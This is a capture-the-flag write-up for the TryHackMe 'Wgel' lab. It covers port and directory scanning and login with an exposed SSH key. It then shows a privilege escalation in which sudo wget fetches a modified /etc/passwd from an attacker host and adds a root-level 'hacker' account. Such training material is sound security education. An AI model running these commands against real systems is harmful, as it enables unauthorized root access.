# Wgel — TryHackMe CTF Writeup

- **OS:** Linux
- **Target IP:** `10.64.184.245`

---

## Enumeration

### Nmap Scan

Starting with a service and port scan using Nmap:

```bash
nmap -sC -sV -A 10.64.184.245
```

**Output:**

```
Nmap scan report for 10.64.184.245
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open ports were found:

- **22** — SSH
- **80** — Apache HTTP server showing the default Ubuntu page

### Source Code Analysis

Inspecting the page source at `view-source:http://10.64.184.245/` revealed the following HTML comment:

```html
<!-- Jessie don't forget to update the website -->
```

This suggests a potential username: **jessie**.

### Directory Fuzzing

A directory scan was performed on port 80 using Gobuster:

```bash
gobuster dir --url http://10.64.184.245:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Output:**

```
/.hta                 (Status: 403)
/.htpasswd            (Status: 403)
/.htaccess            (Status: 403)
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403)
/sitemap              (Status: 301) --> http://10.64.184.245/sitemap/
```

The `/sitemap/` directory hosts a demo website using the UnApp template. A deeper scan was run against it:

```bash
gobuster dir --url http://10.64.184.245:80/sitemap/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Output:**

```
/.htaccess            (Status: 403)
/.htpasswd            (Status: 403)
/.hta                 (Status: 403)
/.ssh                 (Status: 301) --> http://10.64.184.245/sitemap/.ssh/
/css                  (Status: 301)
/fonts                (Status: 301)
/images               (Status: 301)
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301)
```

The `.ssh/` directory is particularly interesting — it contains an exposed **private SSH key** (`id_rsa`).

---

## Initial Access

The private key was downloaded and used to authenticate as the `jessie` user discovered earlier:

```bash
ssh -i id_rsa jessie@10.64.184.245
```

The login succeeded. Navigating the filesystem, the user flag was found at:

```
/home/jessie/Documents/user_flag.txt
```

---

## Privilege Escalation

### Sudo Enumeration

Running `sudo -l` revealed the following:

```
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

The user `jessie` can run `/usr/bin/wget` as **root without a password**. This can be abused to overwrite sensitive system files.

### Exploiting wget to Overwrite /etc/passwd

**Step 1 — Copy `/etc/passwd` from the target:**

```bash
sudo wget http://<ATTACKER_IP>/passwd -O /etc/passwd
```

Wait — first, we need to get a copy of the original `/etc/passwd` and modify it locally.

**Step 2 — Generate a password hash on the attacker machine:**

```bash
openssl passwd -1 -salt hacker password123
```

This produces an MD5-based hash of the password `password123`.

**Step 3 — Add a new root-level user to the local copy of `/etc/passwd`:**

```
hacker:$1$hacker$maoVUGb6XNp03USLr9Oqq1:0:0:root:/root:/bin/bash
```

This entry creates a user `hacker` with UID/GID `0` (root privileges).

**Step 4 — Serve the modified file from the attacker machine:**

```bash
python3 -m http.server 80
```

**Step 5 — Overwrite `/etc/passwd` on the target using `wget` as root:**

```bash
sudo wget http://<ATTACKER_IP>/passwd -O /etc/passwd
```

**Step 6 — Switch to the new user:**

```bash
su hacker
# Password: password123
```

Root access was obtained. The root flag is located at:

```
/root/root_flag.txt
```

---

## Tools Summary

| Tool | Purpose |
|------|---------|
| Nmap | Port discovery and service/version detection |
| Gobuster | Directory and file enumeration on the web server |
| OpenSSL | Password hash generation for `/etc/passwd` manipulation |
| Python HTTP server | Serving the modified `passwd` file to the target |
